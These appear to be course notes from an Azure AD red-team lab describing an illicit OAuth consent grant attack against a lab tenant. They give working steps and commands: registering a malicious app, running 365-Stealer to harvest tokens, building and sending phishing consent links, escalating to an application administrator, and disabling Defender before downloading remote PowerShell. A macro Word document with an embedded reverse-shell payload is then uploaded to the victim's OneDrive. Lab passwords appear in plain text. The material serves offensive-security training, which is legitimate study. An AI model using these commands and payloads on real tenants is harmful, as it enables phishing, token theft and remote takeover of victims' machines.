# 05 - Concent, Permission and Initial Access Part 2

- [05 - Concent, Permission and Initial Access Part 2](#05---concent-permission-and-initial-access-part-2)
  - [Consent and Permissions](#consent-and-permissions)
  - [Consent and Permissions - Low Impact Permissions](#consent-and-permissions---low-impact-permissions)
  - [Initial Access - Illicit Consent Grant](#initial-access---illicit-consent-grant)
  - [Initial Access - Illicit Consent Grant - 365 Stealer](#initial-access---illicit-consent-grant---365-stealer)

---

## Consent and Permissions

![picture 19](images/f3127cac5d242710a2e5ee8ae5964ee21c50244c3461c988713602ec8e379898.png)  

Applications can ask users for permissions to access their data. For example, for basic sign-in.

If allowed, a normal user can grant consent only for "Low Impact" permissions. In all other cases, admin consent is required (an admin is notified over email).

GA, Application Administrator, Cloud Application Administrator and a custom role including '`permission to grant permissions to applications`' can provide tenantwide consent.

<br/>

Consent policies can be set for all users:

- Do not allow user consent
- Allow user consent for apps from verified publishers, for selected permissions - Only for "Low Impact" permissions for apps from same tenant and verified publisher
- Allow user consents for all apps - Allows consent for apps from other tenants and unverified publishers for Low Impact permissions
- Custom app consent policy

Note:
These are important; if the above policies are not set, the attack won't work!

<br/>

'`Allow user consent for all apps`' is interesting and abusable!

<br/>

---

## Consent and Permissions - Low Impact Permissions

Only the permissions that don't need admin consent can be classified as low impact.

Permissions required for basic sign-in are openid, profile, email, User.Read and offline_access.

That means, if an organization allows user consent for all apps, an employee can **grant consent to an app to read the above from their profile**. 

There are some very interesting low impact permissions. For example: `User.ReadBasic.All` that allows the app to read display name, first and last name, email address, open extensions and photo for all the users!

![picture 1](images/28d9121d9e9ee8257d2f1efe8d5d21d50e8654096413afaa887715a58e1738a6.png)  


<br/>

---

## Initial Access - Illicit Consent Grant

![picture 20](images/7e9112bd816d9869acda9871ce473e62e676fbb402fbe88e7d570f643b0b6e8b.png)  

<br/>

Register a Multitenant application `studentx` in `defcorpextcontractors` tenant. Provide the Redirect URI where you would like to receive tokens. In the lab, it will be the student VM https://172.16.151.X/login/authorized (or `172.16.150.X` or `172.16.152.X` depending on your location).

![picture 2](images/73b44c6294b8dda3f526c6538a9c6785d44a44a5dda101a4fbd06f549378b509.png)  

![picture 3](images/43e836a3593d20043e8d55814465c5c0025030b211e5d6ee4df5c8d60da9cd68.png)  

<br/>

Go to the '**Certificates & secrets**' blade and create new Client secret. 
- Copy the client secret before browsing away from the page.

![picture 4](images/d52820b7db7ea60e9c6b010eea687cf932789bda7dbefca185300f5e851343c6.png)  

![picture 5](images/bfe36490cc3bc159d963432cc0786925e9392b9194a5ec1c5bbed20e4216d020.png)  

<br/>

- Go to the 'API permissions' blade and add the following Delegated permissions for Microsoft Graph: 
  - user.read
  - User.ReadBasic.All

![picture 6](images/8d889701da74edbdd639fbefa9fdf21ecdead7d14b53be7115beff514287b493.png)  


<br/>

Note: In case we want to use Access tokens, following config is required 
- In the 'Authentication' option of the studentx app, check 'Access tokens (used for implicit flows)' and click on 'Save'. 
- We will use Refresh token so no configuration is required.

<br/>

We have user privilege access to the defcorphq tenant. Check if users are allowed to consent to apps. Use Azure Portal or the below command from the **AzureAD Preview** module:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds

(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

If the output of above is `ManagePermissionGrantsForSelf.microsoftuser-default-legacy`, that means users can consent for all apps! In a real assessment, we simply need to try to know.

![picture 7](images/4f63dbb3075e3b17aa40f2ffc4ba957651cc0c5195557fb09021f4d7e8dc3221.png)  

<br/>

---

## Initial Access - Illicit Consent Grant - 365 Stealer

We can use **365 stealer** to abuse the consent grant settings:
- https://github.com/AlteredSecurity/365-Stealer

<br/>

Note:
Please note that the attack can be executed using the **o365 toolkit** (https://github.com/mdsecactivebreach/o365-attack-toolkit).

<br/>

1. Run **xampp Control Panel** (Run as administrator) and start Apache on the student VM. 
2. Copy the '365-stealer' directory from `C:\AzAD\Tools` to `C:\xampp\htdocs` to capture tokens returned by Azure AD. 
3. Edit `365-Stealer.py`, in the config section and change `CLIENTID`, `REDIRECTURL` and `CLIENTSECRET`
4. Go to C:\xampp\htdocs\35-stealer directory and Start the 365-stealer

```
&"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

![picture 8](images/802f4c7fa8ac3f9a1a63d287c65854946849e7386f808886f4a12a9f22fe0717.png)  

<br/>

Then Browse to `https://localhost` using an incognito window and click on 'Read More' in the web page. This gives you the phishing link that is to be sent to the target.

![picture 9](images/f9b7799afa478d96bb5ccb95d6043df74f12632cc5fe20b4dfe3cc1109dc4b4e.png)  

![picture 10](images/80d35f8946a72212442d698af301114f247cd40724d0a506e1b7a3607b62f2bc.png)  

<br/>

We need to find a way to send the link to targets. We can abuse applications that allow us to contact users in the target organization. We can find applications running on the `defcorphq` tenant by *sub-domain recon*.

![picture 11](images/e604993d34481a28c6085f115dfae53e4d5120e508a863668fed8ecde4c20b15.png)  

![picture 12](images/d415f48397fdfa065d032926b45bc3a52eebfc32ec302370e79cf4dc7094600c.png)  

The phishing link:
- `https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=4aaa3d88-a3f6-43f0-8ef1-1bd9e043a3d0&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.190%2Flogin%2Fauthorized&response_mode=query&sso_reload=true`

<br/>

Use **MicroBurst** to find the applications. We can add permutations like career, hr, users, file, backup to the `permuations.txt` used by MicroBurst etc. However in this case it cannot identify the target application.

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1; Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

<br/>

Therefore, we will assume that the https://defcorphqcareer.azurewebsites.net application is known as a contractor may have some existing knowledge of the target.

<br/>

Using the 'Need Help' section of the career application running on defcorphq, send the phishing link.

https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=dd84e18a-4b33-45c8-b36c-41ccb4624802&scope=https://graph.microsoft.com/.default+openid+offline_access+&redirect_uri=https://172.16.151.X/login/authorized&response_mode=query&sso_reload=true


- `response_type`: Must be "code" for authorization code flow (can be used to request access and refresh tokens)
- `client_id`: **Application ID** of the application that you registered (`NOT` the secret client ID!)
- `scope`: List for Microsoft Graph permissions
- `redirect_uri`: The redirect uri specified during app registration
- `response_mode`: "query" provides the code as query string parameter

![picture 13](images/ee2dcfd03211e667f0088e1f48da3e4dcbf92c02be66ba93de355f591c9bf1c7.png)  

<br/>

Wait for couple of minutes and browse to `http://localhost:82/365-Stealer/yourvictims/`  (please run xampp as admin and start the Apache service) on the attacking machine to get tokens for victims who click on the phishing link.

![picture 14](images/99d3f2ae5f81da80cfcf915e4ad8bc9926a512a08550a51b9ed26574ca570e1c.png)

![picture 15](images/8d75a9f0dc9083343117abb4994e93ab960f7ec483cfcf487aa0b9b08a16b53a.png)  

<br/>

Use the access token with the Graph API to list other users in the tenant. Note that only the permissions that we requested earlier are available with the access token. We can list all the users thanks to `User.ReadBasic.All`.

```
$Token = 'eyJ0eXAiOiJK...'
$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization'= "Bearer $Token"
  }

(Invoke-RestMethod @RequestParams).value
```

![picture 16](images/b4a368b239f152202eb8c718f5b8967e26e62a80511d978d0abf034091764b6c.png)  

<br/>

We need to target an Application Administrator to grant consent for better permissions. Ideally, we have to target all the users. 

For the lab, we can use our earlier enumeration that Application Administrator role is assigned to `markdwalden@defcorphq.onmicrosoft.com`.

We need to register a new app (or modify existing one) and now request permissions that need admin consent:
- mail.read
- notes.read.all
- mailboxsettings.readwrite
- files.readwrite.all
- mail.send

![picture 17](images/9cbc0bb9a8112d0d42770a2af29b6efcdd6bab098f61342eb291f707dff79730.png)  

<br/>

Generate a new link using 'Read More' on https://localhost and send an email to the user containing that link (Remember to change the client ID if you register a new application):

- https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=2bed99c4-a6b0-4eb3-b080-8344ceb6d8a5&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.190%2Flogin%2Fauthorized&response_mode=query

Once the user simulation grants consent, we will get the access token of the application administrator.

![picture 18](images/85ab4a6fbfe2aab9ffda2320e7e559c742ed0eed45f362dd7efd256ba15fe53b.png)  

![picture 19](images/84ff1398e5d1353d5cbb1080e89333c41198908d6b6090583e6a1912ef88def6.png)  


<br/>

Using the access token of application administrator, we can use **365-stealer** to upload macro infested doc files to the user's OneDrive. The user simulation will open these macro infested word files and execute the macro.

A licensed version of Office 365 is available on 172.16.1.250 to create doc files:

```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)

$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds

Enter-PSSession -Session $officeVM

Set-MpPreference -DisableRealtimeMonitoring $true

IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.x:82/Out-Word.ps1")


Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc

Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
```

<br/>

Start a listener on the student VM. On the student VM, use **365-stealer** to upload the doc to OneDrive of `MarkDWalden@defcorphq.onmicrosoft.com`:

```
python C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
```

<br/>

